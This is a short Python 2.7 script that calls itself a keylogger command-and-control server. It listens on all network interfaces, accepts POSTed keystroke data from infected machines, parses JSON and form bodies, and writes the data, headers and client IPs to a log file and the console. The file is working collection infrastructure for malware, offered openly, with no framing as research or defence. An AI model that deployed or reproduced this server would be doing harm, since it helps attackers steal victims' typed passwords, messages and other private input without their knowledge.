#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
"""
Simple HTTP POST Server for Keylogger Data Collection
Python 2.7.18 Compatible
"""

import BaseHTTPServer
import urlparse
import json
import datetime
import os

# Configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 8675
LOG_FILE = 'keylogger_data.log'

class KeyloggerHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_POST(self):
        """Handle POST requests from keylogger"""
        try:
            # Get content length
            content_length = int(self.headers.getheader('content-length', 0))

            # Read POST data
            post_data = self.rfile.read(content_length)

            # Parse different content types
            content_type = self.headers.getheader('content-type', '')

            # Log request metadata
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            client_ip = self.client_address[0]

            log_entry = {
                'timestamp': timestamp,
                'client_ip': client_ip,
                'headers': dict(self.headers),
                'raw_data': post_data
            }

            # Attempt to parse JSON if content-type is JSON
            if 'application/json' in content_type:
                try:
                    log_entry['parsed_data'] = json.loads(post_data)
                except ValueError:
                    log_entry['parsed_data'] = 'Invalid JSON'

            # Parse URL-encoded data
            elif 'application/x-www-form-urlencoded' in content_type:
                log_entry['parsed_data'] = urlparse.parse_qs(post_data)

            # Write to log file
            with open(LOG_FILE, 'a') as f:
                f.write('\n' + '='*80 + '\n')
                f.write('Timestamp: {}\n'.format(timestamp))
                f.write('Client IP: {}\n'.format(client_ip))
                f.write('Content-Type: {}\n'.format(content_type))
                f.write('Raw Data: {}\n'.format(post_data))
                if 'parsed_data' in log_entry:
                    f.write('Parsed Data: {}\n'.format(log_entry['parsed_data']))
                f.write('='*80 + '\n')

            # Print to console
            print "[+] Received POST from {}".format(client_ip)
            print "[+] Data: {}".format(post_data)

            # Send success response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write('OK')

        except Exception as e:
            print "[-] Error processing request: {}".format(str(e))
            self.send_error(500, 'Internal Server Error')

    def log_message(self, format, *args):
        """Suppress default logging to avoid clutter"""
        pass

def run_server():
    """Start the HTTP server"""
    server_address = (HOST, PORT)
    httpd = BaseHTTPServer.HTTPServer(server_address, KeyloggerHandler)

    print "[*] Keylogger C2 Server Starting..."
    print "[*] Listening on {}:{}".format(HOST, PORT)
    print "[*] Logging to: {}".format(os.path.abspath(LOG_FILE))
    print "[*] Press Ctrl+C to stop\n"

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print "\n[!] Server stopped by user"
        httpd.shutdown()

if __name__ == '__main__':
    run_server()
